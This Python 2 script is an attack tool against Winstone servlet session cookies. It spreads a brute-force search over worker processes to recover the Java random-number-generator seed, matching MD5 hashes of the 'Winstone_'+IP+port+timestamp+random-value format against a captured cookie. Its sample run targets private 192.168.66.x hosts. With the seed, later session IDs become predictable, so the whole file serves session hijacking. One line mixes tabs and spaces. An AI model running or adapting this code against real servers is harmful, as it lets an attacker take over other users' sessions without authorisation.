from JavaLCGLib import JavaLCGMimic
import hashlib
from multiprocessing import Process,Queue,Value
import time

PRNGseekMax = 1 #global value, estimates PRNG max seek
timeMillisDelay = 1000 #global value, differense in milli seconds between time cookie was generated and time we got response
PRNGMillisDelta = 1000*60 #global value, maximum gap between PRNGMillis estimate and its real value


def recoverPRNGState(cookie,timeMillisEstimate,PRNGMillisEstimate,IPAddr,serverPort,numWorkers,chunkSize):
    global PRNGMillisDelta
    
    q = Queue(0)
    i = 0
    for i in range(PRNGMillisEstimate,PRNGMillisEstimate+PRNGMillisDelta-PRNGMillisDelta%chunkSize,chunkSize):
        q.put((i,i+chunkSize,1))
        #print (i,i+chunkSize,1)
       
    if PRNGMillisDelta%chunkSize > 0:
        q.put((PRNGMillisEstimate+PRNGMillisDelta-PRNGMillisDelta%chunkSize,PRNGMillisEstimate+PRNGMillisDelta,1))
        #print (PRNGMillisEstimate+PRNGMillisDelta-PRNGMillisDelta%chunkSize,PRNGMillisEstimate+PRNGMillisDelta,1)

    #raw_input('Enter')
    desc = []

    seedValue = Value('d', 0)

    # Start worker processes and assign work.                     
    for i in range(numWorkers):
        p = Process(target=recoverPRNGStateWorker, args=(cookie,timeMillisEstimate,q,IPAddr,serverPort,seedValue))
        p.start()
        desc.append(p)
        
    # Wait for worker processes finish.       
    for p in desc:
        p.join()

    return long(seedValue.value)

def recoverPRNGStateWorker(cookie,timeMillisEstimate,workQueue,IPAddr,serverPort,seedValue):
    global PRNGseekMax
    global timeMillisDelay

    while True:
        if seedValue.value != 0:
            return 0
        
        (PRNGMillisMin,PRNGMillisMax,PRNGseek) = workQueue.get(block=False)
        workQueue.put((PRNGMillisMin,PRNGMillisMax,PRNGseek+1))

        if PRNGseek > PRNGseekMax:
            return -1
        
        for PRNGMillis in range(PRNGMillisMin,PRNGMillisMax):
            #if seedValue.value != 0:
                #return 0
            
            g = JavaLCGMimic(PRNGMillis)

            PRNGout = -1
            for s in range(PRNGseek):
                PRNGout = g.nextLong()

            for timeMillis in range(timeMillisEstimate-timeMillisDelay,timeMillisEstimate+1000):               
                md5dig = hashlib.md5()
                md5dig.update("Winstone_"+IPAddr+"_"+serverPort+"_"+str(timeMillis)+str(PRNGout))
    
                if md5dig.hexdigest() == cookie:
		    print "PRNGMillis =",PRNGMillis
                    seedValue.value = g.seed
                    return 0

if __name__ == "__main__":
    start = time.time()
    #print recoverPRNGState('95d3de1617927e7b494a80a4a50c2daf',1389037663000,1390131477000,"192.168.66.3","8080",3,20) #5s
    print recoverPRNGState('b9b5cf6a9f29d812f9eae81ecd8918f2',1390131851000,1390131427000,"192.168.66.2","8080",6,100) #295s
    print "Elapsed time is '%s' seconds"%(time.time()-start)
